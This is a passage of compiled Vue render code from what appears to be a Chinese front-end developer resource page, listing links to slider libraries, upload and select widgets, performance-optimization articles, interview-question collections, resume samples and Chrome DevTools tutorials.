地址")]),t("p",[t("a",{attrs:{href:"http://www.swipejs.com",target:"_blank"}},[n._v("无缝切换")])]),t("p",[t("a",{attrs:{href:"http://www.idangero.us/swiper",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/fullpage",target:"_blank"}},[n._v("全屏fullpage")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiqiboy/touchslider",target:"_blank"}},[n._v("单个图片切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/slip.js",target:"_blank"}},[n._v("单个全屏切换")])]),t("p",[t("a",{attrs:{href:"http://touch.code.baidu.com/examples.html?qq-pf-to=pcqq.group",target:"_blank"}},[n._v("百度的切换库")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/iSlider",target:"_blank"}},[n._v("单个全屏切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/saw/touch-interfaces",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"http://baijs.com/tinycircleslider",target:"_blank"}},[n._v("旋转拖动设置")])]),t("p",[t("a",{attrs:{href:"http://touchslider.com",target:"_blank"}},[n._v("类似于swipe切换")])]),t("p",[t("a",{attrs:{href:"http://www.swiper.com.cn/demo/index.html",target:"_blank"}},[n._v("支持多种形式的触摸滑动")])]),t("p",[t("a",{attrs:{href:"https://github.com/joker-ye/main/blob/master/wap/index.html",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"http://www.superslide2.com",target:"_blank"}},[n._v("大话主席pc移动图片轮换")])]),t("p",[t("a",{attrs:{href:"https://github.com/hahnzhu/parallax.js",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"https://github.com/yanhaijing/zepto.fullpage",target:"_blank"}},[n._v("基于zepto的fullpage")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/plums/archive/2013/01/10/WebApp-fixed-width-layout-of-multi-terminal-adapter-since.html",target:"_blank"}},[n._v("[WebApp]定宽网页设计下，固定宽度布局开发WebApp并实现多终端下WebApp布局自适应")])]),t("p",[t("a",{attrs:{href:"http://loo2k.com/blog/detecting-wechat-client",target:"_blank"}},[n._v("判断微信客户端的那些坑")])]),t("p",[t("a",{attrs:{href:"https://github.com/JefferyWang/nativeShare.js",target:"_blank"}},[n._v("可以通过javascript直接调用原生分享的工具")])]),t("p",[t("a",{attrs:{href:"http://www.jiathis.com/help/html/weixin-share-code",target:"_blank"}},[n._v("JiaThis 分享到微信代码")])]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com/blog/2015/05/cross-mobile",target:"_blank"}},[n._v("聊聊移动端跨平台开发的各种技术")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/29922082",target:"_blank"}},[n._v("前端自动化测试")])]),t("p",[t("a",{attrs:{href:"http://ajccom.github.io/niceslider",target:"_blank"}},[n._v("多种轮换图片")])]),t("p",[t("a",{attrs:{href:"https://mango.github.io/slideout",target:"_blank"}},[n._v("滑动侧边栏")])]),t("p",[n._v("文件上传")]),t("p",[n._v("文件上传 地址")]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com/webuploader",target:"_blank"}},[n._v("百度上传组件")])]),t("p",[t("a",{attrs:{href:"https://blueimp.github.io/jQuery-File-Upload",target:"_blank"}},[n._v("上传")])]),t("p",[t("a",{attrs:{href:"http://www.hdfu.net",target:"_blank"}},[n._v("flash 头像上传")])]),t("p",[t("a",{attrs:{href:"http://www.dropzonejs.com",target:"_blank"}},[n._v("图片上传预览")])]),t("p",[t("a",{attrs:{href:"http://elemefe.github.io/image-cropper",target:"_blank"}},[n._v("图片裁剪")])]),t("p",[t("a",{attrs:{href:"http://www.shearphoto.com",target:"_blank"}},[n._v("图片裁剪-shearphoto")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/project/tag/284/jquery-image-tools?lang=0&os=0&sort=view&p=2",target:"_blank"}},[n._v("jQuery图片处理")])]),t("p",[n._v("模拟select")]),t("p",[n._v("模拟select 地址")]),t("p",[t("a",{attrs:{href:"http://aui.github.io/popupjs/doc/selectbox.html",target:"_blank"}},[n._v("糖饼 select")])]),t("p",[t("a",{attrs:{href:"https://github.com/rmm5t/jquery-flexselect",target:"_blank"}},[n._v("flexselect")])]),t("p",[t("a",{attrs:{href:"http://loudev.com",target:"_blank"}},[n._v("双select")])]),t("p",[t("a",{attrs:{href:"http://select2.github.io",target:"_blank"}},[n._v("select2")])]),t("p",[n._v("取色插件")]),t("p",[n._v("取色插件 地址")]),t("p",[t("a",{attrs:{href:"http://www.jq22.com/plugin/367",target:"_blank"}},[n._v("类似 Photoshop 的界面取色插件")])]),t("p",[t("a",{attrs:{href:"https://github.com/jquery/jquery-color",target:"_blank"}},[n._v("jquery color")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/project/tag/287/color-picker",target:"_blank"}},[n._v("取色插件集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/mattfarina/farbtastic",target:"_blank"}},[n._v("farbtastic 圆环＋正方形")])]),t("p",[n._v("城市联动")]),t("p",[n._v("城市联动 地址")]),t("p",[t("a",{attrs:{href:"http://www.ijquery.cn/?p=360",target:"_blank"}},[n._v("jquery.cityselect.js基于jQuery+JSON的省市或自定义联动效果")])]),t("p",[n._v("剪贴板")]),t("p",[n._v("剪贴板 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/zeroclipboard/zeroclipboard",target:"_blank"}},[n._v("剪贴板")])]),t("p",[t("a",{attrs:{href:"http://zenorocha.github.io/clipboard.js",target:"_blank"}},[n._v("clipboard 最新的剪切方案")])]),t("p",[t("a",{attrs:{href:"https://github.com/zenorocha/clipboard.js",target:"_blank"}},[n._v("不是Flash的剪贴板")])]),t("p",[n._v("简繁转换")]),t("p",[n._v("简繁转换 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/BYVoid/OpenCC",target:"_blank"}},[n._v("简繁转换")])]),t("p",[n._v("表格 Grid")]),t("p",[n._v("表格 Grid 地址")]),t("p",[t("a",{attrs:{href:"http://facebook.github.io/fixed-data-table",target:"_blank"}},[n._v("facebook表格")])]),t("p",[t("a",{attrs:{href:"http://handsontable.com",target:"_blank"}},[n._v("类似于Excel编辑表格-handsontable")])]),t("p",[t("a",{attrs:{href:"http://bootstrap-table.wenzhixin.net.cn",target:"_blank"}},[n._v("bootstrap-table插件")])]),t("p",[t("a",{attrs:{href:"https://www.datatables.net",target:"_blank"}},[n._v("datatables")])]),t("p",[n._v("在线演示")]),t("p",[n._v("在线演示 地址")]),t("p",[t("a",{attrs:{href:"http://runjs.cn",target:"_blank"}},[n._v("js 在线编辑 - runjs")])]),t("p",[t("a",{attrs:{href:"http://jsbin.com",target:"_blank"}},[n._v("js 在线编辑 - jsbin")])]),t("p",[t("a",{attrs:{href:"http://codepen.io",target:"_blank"}},[n._v("js 在线编辑 - codepen")])]),t("p",[t("a",{attrs:{href:"http://jsfiddle.net",target:"_blank"}},[n._v("js 在线编辑 - jsfiddle")])]),t("p",[t("a",{attrs:{href:"http://ideone.com",target:"_blank"}},[n._v("java 在线编辑 - runjs")])]),t("p",[t("a",{attrs:{href:"http://code.hcharts.cn",target:"_blank"}},[n._v("js 在线编辑 - hcharts")])]),t("p",[t("a",{attrs:{href:"http://jsdm.com",target:"_blank"}},[n._v("js 在线编辑 - jsdm")])]),t("p",[t("a",{attrs:{href:"http://sqlfiddle.com",target:"_blank"}},[n._v("sql 在线编辑 - sqlfiddle")])]),t("p",[t("a",{attrs:{href:"https://thimble.mozilla.org",target:"_blank"}},[n._v("mozilla 在线编辑器")])]),t("p",[n._v("常规优化")]),t("p",[n._v("常规优化 地址")]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/javascript-high-performance-animation-and-page-rendering",target:"_blank"}},[n._v("Javascript高性能动画与页面渲染")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/h5-performance.html",target:"_blank"}},[n._v("移动H5前端性能优化指南")])]),t("p",[t("a",{attrs:{href:"http://ued.5173.com/?p=1731",target:"_blank"}},[n._v("5173首页前端性能优化实践")])]),t("p",[t("a",{attrs:{href:"http://www.uisdc.com/front-end-performance-for-web-designers-and-front-end-developers",target:"_blank"}},[n._v("给网页设计师和前端开发者看的前端性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.orzpoint.com/profiling-css-and-optimization-notes",target:"_blank"}},[n._v("复杂应用的 CSS\n                    性能分析和优化建议")])]),t("p",[n._v("张鑫旭——前端性能 张鑫旭——前端性能")]),t("p",[t("a",{attrs:{href:"http://www.xiaoqiang.org/javascript/font-end-performance-monitor.html",target:"_blank"}},[n._v("前端性能监控总结")])]),t("p",[n._v("网站性能优化之CSS无图片技术 网站性能优化之CSS无图片技术")]),t("p",[n._v("web前端性能优化进阶路 web前端性能优化进阶路")]),t("p",[t("a",{attrs:{href:"http://my.eoe.cn/tuwandou/archive/4544.html",target:"_blank"}},[n._v("前端技术：网站性能优化之CSS无图片技术")])]),t("p",[t("a",{attrs:{href:"http://www.baiduux.com/blog/2011/02/15/browser-loading",target:"_blank"}},[n._v("浏览器的加载与页面性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.w3ctech.com/p/1503",target:"_blank"}},[n._v("页面加载中的图片性能优化")])]),t("p",[n._v("Hey——前端性能 Hey——前端性能")]),t("p",[n._v("html优化 html优化")]),t("p",[n._v("99css——性能 99css——性能")]),t("p",[t("a",{attrs:{href:"http://www.yslow.net/category.php?cid=20",target:"_blank"}},[n._v("Yslow——性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yslow",target:"_blank"}},[n._v("YSLOW中文介绍")])]),t("p",[t("a",{attrs:{href:"http://www.360ito.com/article/40.html",target:"_blank"}},[n._v("转一篇Yahoo关于网站性能优化的文章，兼谈本站要做的优化")])]),t("p",[t("a",{attrs:{href:"http://www.360doc.com/content/10/0928/09/2588264_56971287.shtml",target:"_blank"}},[n._v("Yahoo!团队实践分享：网站性能")])]),t("p",[t("a",{attrs:{href:"http://blog.jiasule.com/i/153",target:"_blank"}},[n._v("网站性能优化指南：什么使我们的网站变慢？")])]),t("p",[t("a",{attrs:{href:"http://www.powereasy.net/helpyou/knowledge/ecommerce/9593.html",target:"_blank"}},[n._v("网站性能优化实践，减少加载时间，提高用户体验")])]),t("p",[t("a",{attrs:{href:"http://www.umtry.com/archives/747.html",target:"_blank"}},[n._v("浅谈网站性能优化 前端篇")])]),t("p",[t("a",{attrs:{href:"http://www.adinnet.cn/blog/designview/2012-7-12/678.html",target:"_blank"}},[n._v("前端重构实践之如何对网站性能优化？")])]),t("p",[t("a",{attrs:{href:"http://www.gbin1.com/technology/javascript/20130708-front-end-performance-optimization-9",target:"_blank"}},[n._v("前端性能优化：使用媒体查询加载指定大小的背景图片")])]),t("p",[t("a",{attrs:{href:"http://www.mykuer.com/post/factors-that-affect-the-speed-of-web-site-open.html",target:"_blank"}},[n._v("网站性能系列博文")])]),t("p",[t("a",{attrs:{href:"http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201109/41355.shtml",target:"_blank"}},[n._v("加载，不只是少一点点")])]),t("p",[t("a",{attrs:{href:"http://mzhou.me/article/95310",target:"_blank"}},[n._v("前端性能的测试与优化")])]),t("p",[t("a",{attrs:{href:"http://www.gbin1.com/technology/html/20130217-tips-for-speed-up-page-loading",target:"_blank"}},[n._v("分享网页加载速度优化的一些技巧？")])]),t("p",[t("a",{attrs:{href:"http://www.f2es.com/images-bytes-opt",target:"_blank"}},[n._v("页面加载中的图片性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.tcreator.info/webSchool/website/Front-end-Opt-Yslow.html",target:"_blank"}},[n._v("web前端优化(基于Yslow")])]),t("p",[t("a",{attrs:{href:"https://www.qianduan.net/website-performance-optimization-tool.html",target:"_blank"}},[n._v("网站性能优化工具大全")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2012/10/high-performance-html",target:"_blank"}},[n._v("【高性能前端1】高性能HTML")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2012/10/high-performance-css",target:"_blank"}},[n._v("【高性能前端2】高性能CSS")])]),t("p",[t("a",{attrs:{href:"http://coolshell.cn/articles/6470.html",target:"_blank"}},[n._v("由12306谈谈网站前端性能和后端性能优化")])]),t("p",[n._v("AlloyTeam——前端优化 AlloyTeam——前端优化")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/developersupport/p/3248695.html",target:"_blank"}},[n._v("毫秒必争，前端网页性能最佳实践")])]),t("p",[t("a",{attrs:{href:"http://blog.sina.com.cn/s/blog_6e9d2e0701017kvu.html",target:"_blank"}},[n._v("网站性能工具Yslow的使用方法")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part1",target:"_blank"}},[n._v("前端工程与性能优化（上）：静态资源版本更新与缓存")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part2",target:"_blank"}},[n._v("前端工程与性能优化（下）：静态资源管理与模板框架")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/48369",target:"_blank"}},[n._v("HTTPS连接的前几毫秒发生了什么")])]),t("p",[t("a",{attrs:{href:"http://uicss.cn/yslow/#more-12319",target:"_blank"}},[n._v("Yslow")])]),t("p",[t("a",{attrs:{href:"http://blog.smartbear.com/web-performance/essential-web-performance-metrics-a-primer-part-1",target:"_blank"}},[n._v("Essential Web Performance Metrics — A Primer, Part 1")])]),t("p",[t("a",{attrs:{href:"http://blog.smartbear.com/performance/essential-web-performance-metrics-part-2",target:"_blank"}},[n._v("Essential Web Performance Metrics — Part 2")])]),t("p",[t("a",{attrs:{href:"http://jayli.github.io/blog/data/2011/12/23/yuislide.html",target:"_blank"}},[n._v("YUISlide,针对移动设备的动画性能优化")])]),t("p",[t("a",{attrs:{href:"http://joelglovier.com/improving-site-performance",target:"_blank"}},[n._v("Improving Site Performance")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000367899",target:"_blank"}},[n._v("让网站提速的最佳前端实践")])]),t("p",[t("a",{attrs:{href:"http://sixrevisions.com/web-development/why-website-speed-is-important",target:"_blank"}},[n._v("Why Website\n                    Speed is Important")])]),t("p",[t("a",{attrs:{href:"https://www.devbridge.com/articles/need-for-speed-how-to-improve-your-website-performance",target:"_blank"}},[n._v("Need for Speed – How to Improve your Website Performance")])]),t("p",[t("a",{attrs:{href:"https://github.com/amfe/article/issues/1",target:"_blank"}},[n._v("阿里无线前端性能优化指南 (Pt.1 加载期优化")])]),t("p",[n._v("优化工具")]),t("p",[n._v("优化工具 地址")]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/3083",target:"_blank"}},[n._v("JavaScript 性能分析新工具 OneProfile")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/3091",target:"_blank"}},[n._v("JavaScript 堆内存分析新工具 OneHeap")])]),t("p",[n._v("在线工具")]),t("p",[n._v("在线工具 地址")]),t("p",[t("a",{attrs:{href:"https://developers.google.com/speed/pagespeed/insights",target:"_blank"}},[n._v("google在线工具")])]),t("p",[t("a",{attrs:{href:"http://www.alibench.com",target:"_blank"}},[n._v("阿里测")])]),t("p",[t("a",{attrs:{href:"http://itest.aliyun.com",target:"_blank"}},[n._v("阿里-免费测试服务")])]),t("p",[t("a",{attrs:{href:"https://github.com/alibaba/f2etest",target:"_blank"}},[n._v("阿里-F2etest多浏览器兼容性测试解决方案")])]),t("p",[t("a",{attrs:{href:"http://jsperf.com",target:"_blank"}},[n._v("js性能测试")])]),t("p",[n._v("前端架构")]),t("p",[n._v("前端架构 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/topic/19612641",target:"_blank"}},[n._v("技术架构")])]),t("p",[t("a",{attrs:{href:"http://saito.im/note/The-Architecture-of-F2E",target:"_blank"}},[n._v("前端架构")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/24092572",target:"_blank"}},[n._v("如何成为前端架构师")])]),t("p",[t("a",{attrs:{href:"http://hikejun.com/sharing/2010webrebuild/?file=fe-infrastructure.html",target:"_blank"}},[n._v("关于前端架构-张克军")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/25583350",target:"_blank"}},[n._v("百度腾讯offer比较（腾讯游戏VS百度基础架构）")])]),t("p",[n._v("推荐作品")]),t("p",[n._v("推荐作品 地址")]),t("p",[t("a",{attrs:{href:"https://gist.github.com/wintercn",target:"_blank"}},[n._v("winter代码片段需要FQ")])]),t("p",[t("a",{attrs:{href:"http://www.fgm.cc/learn",target:"_blank"}},[n._v("fgm")])]),t("p",[t("a",{attrs:{href:"https://github.com/hongru/hongru.github.com",target:"_blank"}},[n._v("岑安作品集")])]),t("p",[t("a",{attrs:{href:"http://kmdjs.github.io",target:"_blank"}},[n._v("当耐特demo集合")])]),t("p",[t("a",{attrs:{href:"http://www.laoshu133.com/Lab",target:"_blank"}},[n._v("米空格 js作品")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io",target:"_blank"}},[n._v("myFocus")])]),t("p",[t("a",{attrs:{href:"http://panxuepeng.github.io/seajslib",target:"_blank"}},[n._v("SeaJS组件库")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/myProject",target:"_blank"}},[n._v("颜海镜作品")])]),t("p",[t("a",{attrs:{href:"http://jo2.org/category/myworks",target:"_blank"}},[n._v("脚儿网作品")])]),t("p",[t("a",{attrs:{href:"http://www.cnitblog.com/yemoo/category/3107.html",target:"_blank"}},[n._v("javascript个人作品")])]),t("p",[t("a",{attrs:{href:"http://bbs.miaov.com/forum.php?mod=viewthread&tid=7790",target:"_blank"}},[n._v("妙味的雷东升游戏作品")])]),t("p",[t("a",{attrs:{href:"http://bbs.csdn.net/topics/380227212",target:"_blank"}},[n._v("javascript作品集")])]),t("p",[t("a",{attrs:{href:"https://github.com/TooBug/works",target:"_blank"}},[n._v("云五笔，灰度产生生成工具")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io",target:"_blank"}},[n._v("项目主页")])]),t("p",[t("a",{attrs:{href:"http://zaole.net",target:"_blank"}},[n._v("个性的作品主页")])]),t("p",[t("a",{attrs:{href:"http://static.tingall.com/v2/player",target:"_blank"}},[n._v("播放器")])]),t("p",[t("a",{attrs:{href:"http://ucren.com/blog/demos",target:"_blank"}},[n._v("ucren js demos 集")])]),t("p",[t("a",{attrs:{href:"http://www.zhinengshe.com/works_list.html",target:"_blank"}},[n._v("智能社")])]),t("p",[t("a",{attrs:{href:"http://demos.shizuwu.cn",target:"_blank"}},[n._v("实例陈列架")])]),t("p",[t("a",{attrs:{href:"http://zoye.sinaapp.com/demo",target:"_blank"}},[n._v("zoye demo")])]),t("p",[t("a",{attrs:{href:"http://lab.yuanwai.wang",target:"_blank"}},[n._v("王员外")])]),t("p",[t("a",{attrs:{href:"http://pingfan1990.sinaapp.com",target:"_blank"}},[n._v("平凡")])]),t("p",[t("a",{attrs:{href:"http://www.lovewebgames.com",target:"_blank"}},[n._v("jyg 游戏案例")])]),t("p",[t("a",{attrs:{href:"http://www.helloweba.com/list.html",target:"_blank"}},[n._v("很多jquery插件")])]),t("p",[t("a",{attrs:{href:"http://www.bujichong.com/sojs/api/index.html",target:"_blank"}},[n._v("不羁虫 - soJs 作品系列")])]),t("p",[t("a",{attrs:{href:"http://frozenui.github.io/case.html",target:"_blank"}},[n._v("frozenui")])]),t("p",[t("a",{attrs:{href:"http://js-game.github.io/othello",target:"_blank"}},[n._v("黑白棋")])]),t("p",[t("a",{attrs:{href:"http://yansm.github.io/fromone/index.html",target:"_blank"}},[n._v("fromone")])]),t("p",[t("a",{attrs:{href:"http://pazguille.me",target:"_blank"}},[n._v("pazguille")])]),t("p",[t("a",{attrs:{href:"https://github.com/zmmbreeze/DeadSimpleVideoPlayer",target:"_blank"}},[n._v("Html5 VideoPlayer")])]),t("p",[t("a",{attrs:{href:"http://a-jie.github.io/Proton/#example",target:"_blank"}},[n._v("Proton 烟花")])]),t("p",[n._v("简历模板")]),t("p",[n._v("简历模板 地址")]),t("p",[t("a",{attrs:{href:"http://learnshare.github.io/about/index.html",target:"_blank"}},[n._v("不错的个人简历")])]),t("p",[t("a",{attrs:{href:"http://hcy2367.github.io/resume",target:"_blank"}},[n._v("简历")])]),t("p",[t("a",{attrs:{href:"http://ncuey.sinaapp.com/CrispElite/",target:"_blank"}},[n._v("张伦")])]),t("p",[t("a",{attrs:{href:"https://github.com/hacke2/ResumeSample",target:"_blank"}},[n._v("简历")])]),t("p",[t("a",{attrs:{href:"http://blog.dandyweng.com/2013/07/how-my-website-was-created",target:"_blank"}},[n._v("翁天信")])]),t("p",[t("a",{attrs:{href:"http://www.webhek.com/misc/interactive-resume",target:"_blank"}},[n._v("动画方式的简历")])]),t("p",[t("a",{attrs:{href:"http://www.linqing07.com/resume.html",target:"_blank"}},[n._v("组件丰富简历")])]),t("p",[t("a",{attrs:{href:"http://www.mojianli.com/resume/view",target:"_blank"}},[n._v("简历池")])]),t("p",[t("a",{attrs:{href:"http://www.haorooms.com/about",target:"_blank"}},[n._v("haorooms博客")])]),t("p",[t("a",{attrs:{href:"http://cv.youngdze.com",target:"_blank"}},[n._v("Justin Young")])]),t("p",[n._v("面试题")]),t("p",[n._v("面试题 地址")]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/discuss/3196",target:"_blank"}},[n._v("那几个月在找工作（百度，网易游戏）")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/1743",target:"_blank"}},[n._v("2014最新面试题")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/thread-5598563-2-1.html",target:"_blank"}},[n._v("阿里前端面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/imwtr/p/4685546.html",target:"_blank"}},[n._v("2016校招内推 -- 阿里巴巴前端 -- 三面面试经历")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/article-5599657-1-1.html",target:"_blank"}},[n._v("腾讯面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lvdabao/p/3660707.html",target:"_blank"}},[n._v("年后跳槽那点事：乐视+金山+360面试之行")])]),t("p",[t("a",{attrs:{href:"http://fatesinger.com/2722.html",target:"_blank"}},[n._v("阿里前端面试题上线")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/52cik/p/js-question-lg.html",target:"_blank"}},[n._v("拉勾网js面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/allenxing/p/3724382.html",target:"_blank"}},[n._v("前端面试")])]),t("p",[t("a",{attrs:{href:"http://mianshiti.diandian.com",target:"_blank"}},[n._v("Web开发笔试面试题 大全")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000465431",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions",target:"_blank"}},[n._v("2014最新前端面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/fex-team/interview-questions",target:"_blank"}},[n._v("百度面试")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/forum.php?mod=forumdisplay&fid=51&filter=typeid&typeid=177",target:"_blank"}},[n._v("面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Chinese",target:"_blank"}},[n._v("前端工作面试问题")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000465431",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[n._v("5个经典的前端面试问题 5个经典的前端面试问题")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002562454",target:"_blank"}},[n._v("最全前端面试问题及答案总结")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Large-search-front-team-column%202961",target:"_blank"}},[n._v("如何面试一名前端开发工程师？")])]),t("p",[t("a",{attrs:{href:"https://github.com/hawx1993/Front-end-Interview-questions",target:"_blank"}},[n._v("史上最全 前端开发面试问题及答案整理")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xiaoruo/p/4665163.html",target:"_blank"}},[n._v("前端实习生面试总结")])]),t("p",[t("a",{attrs:{href:"https://github.com/hawx1993/Front-end-Interview-questions",target:"_blank"}},[n._v("史上最全 前端开发面试问题及答案整理")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/78738",target:"_blank"}},[n._v("BAT及各大互联网公司2014前端笔试面试题：JavaScript篇")])]),t("p",[t("a",{attrs:{href:"https://github.com/paddingme/Front-end-Web-Development-Interview-Question",target:"_blank"}},[n._v("前端开发面试题大收集")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiu-deqing/FE-interview",target:"_blank"}},[n._v("收集的前端面试题和答案")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/19568008",target:"_blank"}},[n._v("如何面试前端工程师")])]),t("p",[t("a",{attrs:{href:"https://github.com/markyun/My-blog/blob/master/Front-end-Developer-Questions/Questions-and-Answers/README.md",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/discuss?type=2",target:"_blank"}},[n._v("牛客网-笔试面经")])]),t("p",[n._v("iconfont")]),t("p",[n._v("iconfont 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/21253343",target:"_blank"}},[n._v("中文字体")])]),t("p",[t("a",{attrs:{href:"http://iconfont.cn",target:"_blank"}},[n._v("淘宝字库")])]),t("p",[t("a",{attrs:{href:"http://mux.alimama.com/fonts",target:"_blank"}},[n._v("字体")])]),t("p",[t("a",{attrs:{href:"http://iconfont.cn/help/platform.html",target:"_blank"}},[n._v("制作教程")])]),t("p",[t("a",{attrs:{href:"http://www.zhangxinxu.com/wordpress/?s=icomoon",target:"_blank"}},[n._v("zhangxinxu-icommon")])]),t("p",[t("a",{attrs:{href:"https://icomoon.io/app",target:"_blank"}},[n._v("icommon")])]),t("p",[t("a",{attrs:{href:"http://imooc.com/learn/243",target:"_blank"}},[n._v("用字体在网页中画ICON图标(推荐教程")])]),t("p",[t("a",{attrs:{href:"http://font-spider.org",target:"_blank"}},[n._v("字体压缩工具")])]),t("p",[n._v("Fiddler")]),t("p",[n._v("Fiddler 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/tugenhua0707/p/4623317.html",target:"_blank"}},[n._v("Fiddler调式使用知多少(一深入研究")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/strick/p/4570006.html",target:"_blank"}},[n._v("微信fiddle")])]),t("p",[t("a",{attrs:{href:"http://gaoboy.com/article/26.html",target:"_blank"}},[n._v("微信fiddle")])]),t("p",[n._v("Chrome")]),t("p",[n._v("Chrome 地址")]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools",target:"_blank"}},[n._v("Google Chrome 官方")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4565261.html",target:"_blank"}},[n._v("Chrome - 基础")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4579121.html",target:"_blank"}},[n._v("Chrome - 进阶")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4585983.html",target:"_blank"}},[n._v("Chrome - 性能")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4607497.html",target:"_blank"}},[n._v("Chrome - 性能进阶")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4624241.html",target:"_blank"}},[n._v("Chrome - 移动")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/liyunhua/p/4544738.html",target:"_blank"}},[n._v("Chrome - 使用技巧")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html",target:"_blank"}},[n._v("Chrome -\n                    Console控制台不完全指南")])]),t("p",[t("a",{attrs:{href:"http://c7sky.com/chrome-devtools-workspace.html",target:"_blank"}},[n._v("Chrome - Workspace使浏览器变成IDE")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Nothing-blind%202975",target:"_blank"}},[n._v("network面板")])]),t("p",[t("a",{attrs:{href:"http://anti-code.com/devtools-cheatsheet",target:"_blank"}},[n._v("chrome开发工具快捷键")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/2327",target:"_blank"}},[n._v("chrome调试工具常用功能整理")])]),t("p",[t("a",{attrs:{href:"http://www.iinterest.net/2014/05/09/chrome-dev-tool-workspace",target:"_blank"}},[n._v("Chrome 开发工具 Workspace\n                    使用")])]),t("p",[t("a",{attrs:{href:"http://www.cppblog.com/deercoder/archive/2011/10/22/158886.html",target:"_blank"}},[n._v("Chrome神器Vimium快捷键学习记录")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/sassguide/debug.html",target:"_blank"}},[n._v("sass调试-w3cplus")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/tools/how-to-use-chrome-devtools-like-a-pro.html",target:"_blank"}},[n._v("如何更专业的使用Chrome开发者工具-w3cplus")])]),t("p",[t("a",{attrs:{href:"http://sentsin.com/web/253.html",target:"_blank"}},[n._v("chrome调试canvas")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/index",target:"_blank"}},[n._v("chrome profiles1")])]),t("p",[t("a",{attrs:{href:"http://h5dev.uc.cn/article-25-1.html",target:"_blank"}},[n._v("chrome profiles2")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/translate/performance-optimisation-with-timeline-profiles",target:"_blank"}},[n._v("chrome 